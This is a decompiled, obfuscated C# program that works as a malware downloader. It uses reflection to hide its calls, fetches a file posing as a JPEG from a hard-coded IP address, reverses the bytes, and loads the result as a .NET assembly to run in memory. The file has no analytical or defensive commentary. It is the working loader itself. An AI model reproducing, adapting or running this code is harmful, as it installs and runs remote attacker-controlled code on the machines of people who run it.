using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using ns1;

namespace ns0;

internal static class Class0
{
	private static Assembly Assembly => (Assembly)typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) })!.Invoke(null, new object[1] { smethod_0().Reverse().ToArray() });

	[STAThread]
	public static void Main()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		Class1.smethod_0();
	}

	private static byte[] smethod_0()
	{
		return (byte[])typeof(WebClient).GetMethod("DownloadData", new Type[1] { typeof(Uri) })!.Invoke(new WebClient(), new object[1]
		{
			new Uri("http://91.243.44.75/hbatka.jpeg")
		});
	}

	internal static MethodInfo[] smethod_1()
	{
		List<MethodInfo> list = new List<MethodInfo>();
		List<Type> list2 = new List<Type>();
		list2.AddRange(Assembly.GetExportedTypes());
		foreach (Type item in list2)
		{
			list.AddRange(item.GetMethods());
		}
		return list.ToArray();
	}
}
